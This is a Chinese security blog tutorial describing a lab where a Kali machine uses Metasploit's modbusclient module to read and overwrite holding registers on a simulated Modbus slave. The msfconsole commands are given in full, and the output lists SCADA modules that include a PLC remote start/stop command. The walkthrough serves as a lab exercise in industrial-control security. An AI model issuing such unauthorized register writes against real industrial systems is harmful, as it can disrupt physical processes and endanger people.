<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/8H1B5VTt4sf_-58now2vAA)

**1. 环境配置**  

**1.1 机器配置**
------------

modbus poll:win10 虚拟机

modbus slave:win10 物理机

攻击机：kali 虚拟机 + msf

**1.2 拓扑图**
-----------

![](https://mmbiz.qpic.cn/mmbiz_png/OBIqhUW9z8w0B3I0XmybBHNKaJxuibNTzcr23pqLlMgkv0OaZQriaCaEWYtTTsJ2iaF52jSbWDfBLdwCkhGkaWEGA/640?wx_fmt=png)

**2.  MODBUS 主从模拟器介绍**
======================

**2.1 简介**
----------

**Modbus Poll** ：Modbus 主机仿真器，用于测试和调试 Modbus 从设备。该软件支持 ModbusRTU、ASCII、TCP/IP。用来帮助开发人员测试 Modbus 从设备，或者其它 Modbus 协议的测试和仿真。它支持多文档接口，即，可以同时监视多个从设备 / 数据域。每个窗口简单地设定从设备 ID，功能，地址，大小和轮询间隔。你可以从任意一个窗口读写寄存器和线圈。如果你想改变一个单独的寄存器，简单地双击这个值即可。或者你可以改变多个寄存器 / 线圈值。提供数据的多种格式方式，比如浮点、双精度、长整型（可以字节序列交换）。

**Modbus Slave**：Modbus 从设备仿真器，可以仿真 32 个从设备 / 地址域。每个接口都提供了对 EXCEL 报表的 OLE 自动化支持。主要用来模拟 Modbus 从站设备, 接收主站的命令包, 回送数据包。帮助 Modbus 通讯设备开发人员进行 Modbus 通讯协议的模拟和测试，用于模拟、测试、调试 Modbus 通讯设备。可以 32 个窗口中模拟多达 32 个 Modbus 子设备。与 Modbus Poll 的用户界面相同，支持功能 01, 02, 03, 04, 05, 06, 15, 16, 22 和 23，监视串口数据。

安装后的主从站是这个样子

![](https://mmbiz.qpic.cn/mmbiz_png/OBIqhUW9z8w0B3I0XmybBHNKaJxuibNTzN4xD5oIm85DNBibL8TexRgOicBG6Ja0ibbKIIK5A72Cp0icHayXXt03T5g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/OBIqhUW9z8w0B3I0XmybBHNKaJxuibNTzLMhdyuFsGia9njCbrVEHhteAOc81yfQjEPxZovuSrTptKZicO45xXia3Q/640?wx_fmt=png)

然后这里我们先用 poll 主站点击 connection，这里没有注册码直接点击 OK，然后设置你的从站 ip

![](https://mmbiz.qpic.cn/mmbiz_png/OBIqhUW9z8w0B3I0XmybBHNKaJxuibNTzpZ9mMJkGo9ia0S7TRcA5wjKq5RPCnEBvq98obTTm3Zy8cfFUhjN3uGg/640?wx_fmt=png)

然后去 slave 设置本地 ip, 并且选择 modbus tcp/ip

![](https://mmbiz.qpic.cn/mmbiz_png/OBIqhUW9z8w0B3I0XmybBHNKaJxuibNTz3ic7uQJUZD4Qx7sbyhice50lQYKgGOIXezFS9eV9OY2wDN4ynVkQXTTQ/640?wx_fmt=png)

然后这里是对应操作的代码号

![](https://mmbiz.qpic.cn/mmbiz_png/OBIqhUW9z8w0B3I0XmybBHNKaJxuibNTzNdiaWH6MXvBCQPn1SjUFGMicpY9q6yepx9dicqOTjmTk3FglCeSXcdOuA/640?wx_fmt=png)

然后我们再主站上修改值，可以看到从站也跟着改变

![](https://mmbiz.qpic.cn/mmbiz_png/OBIqhUW9z8w0B3I0XmybBHNKaJxuibNTzW4FowOPG37rHfDea9uoJas7qruubC4BzQdicPHm06sxpXLbJD7iahnKw/640?wx_fmt=png)

参考：https://blog.csdn.net/byxdaz/article/details/77979114

**3. 攻击流程**
===========

操作之前我们用攻击机 kali 去 ping 下从站机器是否可以 ping 通

![](https://mmbiz.qpic.cn/mmbiz_png/OBIqhUW9z8w0B3I0XmybBHNKaJxuibNTz081RxdEwibriaNfeyvZ7lviciayqYicfYneYNQDmFrEOoibjkn9NByZ8NydA/640?wx_fmt=png)

ok 这样可以保证我们的 msf 可以操作到从站机器

**3.1 读取寄存器操作**
---------------

启动 msfconsole

然后寻找 modbus 利用模块

```
msf6 > search modbus

Matching Modules
================

   #  Name                                            Disclosure Date  Rank    Check  Description
   -  ----                                            ---------------  ----    -----  -----------
   0  auxiliary/admin/scada/modicon_command           2012-04-05       normal  No     Schneider Modicon Remote START/STOP Command
   1  auxiliary/admin/scada/modicon_stux_transfer     2012-04-05       normal  No     Schneider Modicon Ladder Logic Upload/Download
   2  auxiliary/analyze/modbus_zip                                     normal  No     Extract zip from Modbus communication
   3  auxiliary/scanner/scada/modbus_banner_grabbing                   normal  No     Modbus Banner Grabbing
   4  auxiliary/scanner/scada/modbus_findunitid       2012-10-28       normal  No     Modbus Unit ID and Station ID Enumerator
   5  auxiliary/scanner/scada/modbusclient                             normal  No     Modbus Client Utility
   6  auxiliary/scanner/scada/modbusdetect            2011-11-01       normal  No     Modbus Version Scanner
```

然后我们利用 auxiliary/scanner/scada/modbusclient

![](https://mmbiz.qpic.cn/mmbiz_png/OBIqhUW9z8w0B3I0XmybBHNKaJxuibNTzBZcibEeJqZib0CgHHsBMbEDsRzvz9Y4Q1UzzzEBScHCNzNicYCXwMdk0g/640?wx_fmt=png)

查看一下配置，首先我们可以看看有哪些操作

```
msf6 auxiliary(scanner/scada/modbusclient) > set action 
set action READ_COILS              set action READ_INPUT_REGISTERS    set action WRITE_REGISTER
set action READ_DISCRETE_INPUTS    set action WRITE_COIL              set action WRITE_REGISTERS
set action READ_HOLDING_REGISTERS  set action WRITE_COILS
```

有对线圈的读写操作, 首先我们可以进行应该读的操作

```
msf6 auxiliary(scanner/scada/modbusclient) > set action READ_HOLDING_REGISTERS 
action => READ_HOLDING_REGISTERS
msf6 auxiliary(scanner/scada/modbusclient) > set rhosts 10.0.7.148
rhosts => 10.0.7.148
msf6 auxiliary(scanner/scada/modbusclient) > set data_address 2
data_address => 2
msf6 auxiliary(scanner/scada/modbusclient) > options
```

然后查看下发现，功能、ip、查看的数据地址已经设置完成了

![](https://mmbiz.qpic.cn/mmbiz_png/OBIqhUW9z8w0B3I0XmybBHNKaJxuibNTzIkavyURu8rg3iciayJTp0onCCW4x1xtwN4cBaP1g8A4OVcicZeswINicIg/640?wx_fmt=png)

然后我们 run 一下

![](https://mmbiz.qpic.cn/mmbiz_png/OBIqhUW9z8w0B3I0XmybBHNKaJxuibNTzh0OWN2AVdoIgGdPkrkgeBBaEaVG64V6lJ2MHdIpI1WkeRMkJh3ibD4g/640?wx_fmt=png)

此时对应的值为 2323，这样应该读寄存器的操作就完成了

![](https://mmbiz.qpic.cn/mmbiz_png/OBIqhUW9z8w0B3I0XmybBHNKaJxuibNTzH1djNvRvib6YBI7H04DONvzoYKkuiaTXZZwnJlzb3Xd8b7womSIia0rHA/640?wx_fmt=png)

**3.2 写寄存器操作**
--------------

然后修改下利用写功能

```
msf6 auxiliary(scanner/scada/modbusclient) > set action WRITE_REGISTER
action => WRITE_REGISTER
msf6 auxiliary(scanner/scada/modbusclient) > optiions
[-] Unknown command: optiions.
msf6 auxiliary(scanner/scada/modbusclient) > options

Module options (auxiliary/scanner/scada/modbusclient):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   DATA            0                no        Data to write (WRITE_COIL and WRITE_REGISTER modes only)
   DATA_ADDRESS    2                yes       Modbus data address
   DATA_COILS                       no        Data in binary to write (WRITE_COILS mode only) e.g. 0110
   DATA_REGISTERS                   no        Words to write to each register separated with a comma (WRITE_REGISTERS mode only) e.g. 1,2,3,4
   NUMBER          1                no        Number of coils/registers to read (READ_COILS, READ_DISCRETE_INPUTS, READ_HOLDING_REGISTERS, READ_INPUT_REGISTERS modes only)
   RHOSTS          10.0.7.148       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT           502              yes       The target port (TCP)
   UNIT_NUMBER     1                no        Modbus unit number


Auxiliary action:

   Name            Description
   ----            -----------
   WRITE_REGISTER  Write one word to a register
```

然后我们设置下配置内容

![](https://mmbiz.qpic.cn/mmbiz_png/OBIqhUW9z8w0B3I0XmybBHNKaJxuibNTzfzuqoj6OW88ib3zPz4R6ArcQe5qOPqCG5c1ic8zHuN8icz7KGJZIvB5OA/640?wx_fmt=png)

刚才我们已经设置好了 iP, 然后我们把写入的地址和值都改一下然后运行

![](https://mmbiz.qpic.cn/mmbiz_png/OBIqhUW9z8w0B3I0XmybBHNKaJxuibNTzDBuYFH37B6GjH7XZ2RadSv0ZlojEZSyzenTejibOtFfyicKeBbFIcP0A/640?wx_fmt=png)

然后我们发现地址 2 的值修改为了 1700, 这样写的操作完成了

![](https://mmbiz.qpic.cn/mmbiz_png/OBIqhUW9z8w0B3I0XmybBHNKaJxuibNTzQVTTemY9pxiapOPTtuoYEzE6qnicCicOI5maAx9aZ6xWur0uNNK5RQPWg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/OBIqhUW9z8w0B3I0XmybBHNKaJxuibNTzJyJGOJOUJnKJhDs6ATQm4UTxQqoeoib44Og39DlKZfZZaTyWlLM0yRQ/640?wx_fmt=png)

**扫码关注 “WaP9 安全搬砖客” 公众号，持续更新文章**

![](https://mmbiz.qpic.cn/mmbiz_png/zl5yfOjG6ENmMlXBUuJEmJyxseEgIdNnc45EhNWCF1hYRd63Zkpia6rMriacqaBmMQ8mkzwX0jse6BE6SickfCicOw/640?wx_fmt=png)

WaP9 安全搬砖客